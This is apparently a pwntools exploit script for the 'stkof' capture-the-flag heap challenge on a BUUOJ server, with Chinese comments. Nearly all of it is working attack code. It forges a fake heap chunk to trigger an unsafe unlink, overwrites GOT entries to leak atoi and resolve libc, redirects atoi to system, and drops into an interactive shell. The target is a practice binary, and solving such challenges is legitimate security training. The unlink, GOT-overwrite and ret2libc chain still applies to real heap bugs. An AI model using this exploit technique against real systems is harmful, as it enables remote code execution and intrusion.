from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'stkof'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='amd64', log_level='debug', endian='little')

'''
UAF
'''
def add_content(size:int):
    global io
    io.sendline(b'1')
    io.sendline(str(size).encode())
    msg = io.recvline()
    io.recvuntil('OK\n')
    print("msg recv:{}".format(msg))
    return msg

def edit_content(idx:int, content:bytes):
    global io
    io.sendline(b'2')
    io.sendline(str(idx).encode())
    io.sendline(str(len(content)).encode())
    io.send(content)
    io.recvline()

def del_content(idx:int):
    global io
    io.sendline(b'3')
    io.sendline(str(idx).encode())
    io.recvuntil('OK\n')

heap_array_addr = 0x602140

# 首先申请块，分配缓冲区
add_content(0x100) # 1

# 申请三个chunk
add_content(0x30) # 2
add_content(0x80) # 3
add_content(0x10) # 4 隔开top chunk


# 触发unlink
payload = p64(0) + p64(0x31) # 在这里伪造chunk,size应该是0x31
payload += p64(heap_array_addr + 0x10 - 0x18) # 伪造fd
payload += p64(heap_array_addr + 0x10 - 0x10) # 伪造bk
payload += p64(0) * 2 # 填充剩下的
payload += p64(0x30) + p64(0x90) # presize; size的pre-in-use位置为0

edit_content(2, payload)

# 释放0x80的块，触发unlink
del_content(3)


# 将got['free']覆盖为puts@plt
payload = p64(0)
payload += p64(io_elf.got['free']) # 0
payload += p64(io_elf.got['atoi']) # 1
edit_content(2, payload)

edit_content(0, p64(io_elf.plt['puts'])) # 覆盖为put@plt

io.sendline(b'3')
io.sendline(str(1).encode()) # atoi
leak_addr = io.recv()
atoi_addr = u64(leak_addr[:6].ljust(8, b'\x00'))
LOG_ADDR_SUCCESS('atoi_addr', atoi_addr)

libc = LibcSearcher('atoi', atoi_addr)
libc_base = atoi_addr - libc.dump('atoi')
system_addr = libc_base + libc.dump('system')

payload = p64(0)
payload += p64(io_elf.got['free']) # 0
payload += p64(io_elf.got['atoi']) # 1
edit_content(2, payload)

edit_content(1, p64(system_addr)) # 将got['atoi']的地址覆盖为system地址

# io.sendline(b'/bin/sh\x00')


io.interactive()
